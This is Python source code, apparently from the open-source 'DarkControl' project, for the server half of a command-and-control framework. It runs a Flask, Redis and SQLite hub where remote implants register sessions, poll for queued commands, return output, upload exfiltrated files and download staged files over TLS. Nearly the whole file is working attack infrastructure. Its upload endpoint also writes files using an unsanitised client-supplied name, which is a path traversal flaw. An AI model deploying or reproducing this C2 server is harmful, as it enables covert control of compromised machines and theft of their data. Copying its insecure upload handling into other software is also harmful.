"""
https://github.com/HackWidMaddy/DarkControl
This script,developed by @HackWidMaddy, Is a C2 (Command and Control) server, provides a REST APIs for initializing, polling, and receiving results from remote sessions.
It serves as the central hub for managing and orchestrating remote activities on client machines.
The script utilizes Flask for creating the web server, Redis for managing a message queue, and SQLite for storing session information.
The main functionalities include:
- Initialization: Allows remote clients to initialize new sessions and records the IP address of the client.
- Polling: Enables remote clients to poll for commands from the server.
- Result Reporting: Provides a mechanism for remote clients to report results back to the server.
- File Upload: Allows clients to upload files to the server.
- File Transfer: Enables clients to download files from the server.

Dependencies:
- Flask: Web framework for creating the server.
- redis: Python client for Redis, used for managing the message queue.
- Werkzeug: Utility library for handling file uploads securely.
- tabulate: Utility for formatting tabular data.
- pyperclip: Library for accessing the clipboard.
- colorama: Library for adding color to the console output.
"""

from flask import Flask, request,send_from_directory,send_file,make_response
import redis
import ssl
from werkzeug.utils import secure_filename
import sqlite3
import datetime
import json
import base64
import os
import logging

# Create a custom logger
logger = logging.getLogger('my_logger')

# Set the level of the logger. This can be set to DEBUG, INFO, WARNING, ERROR, or CRITICAL
logger.setLevel(logging.DEBUG)

# Create handlers
file_handler = logging.FileHandler('logs/app.log')
console_handler = logging.StreamHandler()

# Set level for handlers
file_handler.setLevel(logging.DEBUG)
console_handler.setLevel(logging.ERROR)

# Create formatters and add them to the handlers
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)
console_handler.setFormatter(formatter)

# Add handlers to the logger
logger.addHandler(file_handler)
logger.addHandler(console_handler)

def cursor_initialization():
    conn = sqlite3.connect('DarkControl.db')
    cursor = conn.cursor()
    return cursor,conn

with open('config.json', 'r') as file:
    json_data = json.load(file)

app = Flask(__name__)
redis_client = redis.StrictRedis(host=str(json_data["Redis_Server_IP_Address"]), port=int(json_data["Redis_Server_Port"]), db=0)


@app.route('/initialization', methods=['POST'])
def initialization():
    if request.method == "POST":

        session_name = request.form['session_name']
        ip_addr = request.remote_addr  # Get the IP address of the client
        cursor,conn = cursor_initialization()
        redis_client.lpush('Message',f"New Session Initialized from {ip_addr}")
        logger.info(f'INITIALIZATION FROM {ip_addr}')


        try:
            cursor.execute("select * from sessions where session_name=?",(session_name,))
            data = cursor.fetchall()
            if data:
                cursor.execute("UPDATE SESSIONS SET session_initialization=? where session_name=?",(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),session_name))
                conn.commit()
            else:
                cursor.execute('''
                INSERT INTO sessions (session_name, ip_addr) VALUES (?, ?)
            ''', (session_name, ip_addr))
                conn.commit()
            print(f"inserted session {session_name}")
        except sqlite3.Error as e:
            print(f"An error occurred: {e}")
            logger.error(f'An error occurred: {e} / sqlite3.Error')

        finally:
            conn.close()
        
        return ''  # No command available in the queue
    # return "SUPER SECRET MESSAGE"
    


@app.route('/poll', methods=['POST'])
def index():
    if request.method == "POST":
        session_name = request.form['session_name']
        command = redis_client.lpop(f'queue:{session_name}')
        logger.info(f'poll from {session_name} command: {command}')
        if command:
            return command.decode('utf-8')
        else:
            return ''  # No command available in the queue
    # return "SUPER SECRET MESSAGE"
    
@app.route('/result', methods=['POST'])
def result():
    if request.method == "POST":
        result = request.form['result']
        ip_addr = request.remote_addr
        session_name = request.form['session_name']
        
        if result:
            redis_client.lpush(f'result:{session_name}',str(result))
            logger.info(f'Result {session_name} -> {str(result)} ip:{ip_addr}')
        else:
            redis_client.lpush(f'result:{session_name}',"No Output Of Above Command")
            logger.info(f'Result {session_name} -> No Output Of Above Command ip:{ip_addr}')

            # print(result)  # Process the result
        return ''  # Acknowledge receipt of result


@app.route('/file/<string:session_id>', methods=['POST'])
def file_upload(session_id):
    cursor,conn = cursor_initialization()
    cursor.execute("select * from sessions where session_name=?",(str(session_id),))
    output = cursor.fetchall()
    ip_addr = request.remote_addr  # Get the IP address of the client

    if not output:
        logger.warning(f'Unauthorized Access from {ip_addr} at /file endpoint')
        return 'UnAuthorized Access'
    conn.close()
    try:
        logger.info(f'Request at /file from {str(session_id)} / ip:{ip_addr}')

        # Parse the JSON payload
        data = request.get_json()

        # Ensure the required keys are in the payload
        if 'fileName' not in data or 'fileContent' not in data:
            return 'Invalid payload', 400

        # Get the filename and base64 encoded content
        file_name = data['fileName']
        base64_content = data['fileContent']

        # Decode the base64 content
        file_content = base64.b64decode(base64_content)

        # Specify the path to save the file
        file_path = os.path.join('files', file_name)

        # Ensure the directory exists
        os.makedirs(os.path.dirname(file_path), exist_ok=True)

        # Save the decoded binary content to a file
        with open(file_path, 'wb') as file:
            file.write(file_content)

        return f'File uploaded successfully at /files/{file_name}', 200

    except Exception as e:
        return str(e), 500
    


@app.route("/transfer/<string:session_id>/<string:filename>", methods=['GET'])
def transfer(filename,session_id):
    ip_addr = request.remote_addr  # Get the IP address of the client

    DATA_FOLDER = os.path.join(os.getcwd(), 'transfer')
    cursor,conn = cursor_initialization()
    cursor.execute("select * from sessions where session_name=?",(str(session_id),))
    output = cursor.fetchall()
    if not output:
        logger.warning(f'UnAuthorized Access At /transfer from {ip_addr}')
        return 'UnAuthorized Access'
    conn.close()
    try:
        filename = secure_filename(filename)  # Sanitize the filename
        logger.info(f'Accessing file: {filename} session: {session_id} from ip {ip_addr}')
        file_path = os.path.join(DATA_FOLDER, filename)
        if os.path.isfile(file_path):
            return send_file(file_path, as_attachment=True,download_name=filename)
        else:
            return make_response(f"File '{filename}' not found.", 404)
    except Exception as e:
        logger.error(f'Error: {str(e)} in /transfer endpoint')
        return make_response(f"Error: {str(e)}", 500)
            

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def unauthorized_access(path):
    ip_addr = request.remote_addr  # Get the IP address of the client
    logger.warning(f'UnAuthorized Access At {path} from {ip_addr}')
    return 'Unauthorized Access', 403

if __name__ == '__main__':
    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    context.load_cert_chain('cert.pem', 'key.pem')
    app.run(host='0.0.0.0', port=8000, ssl_context=context)

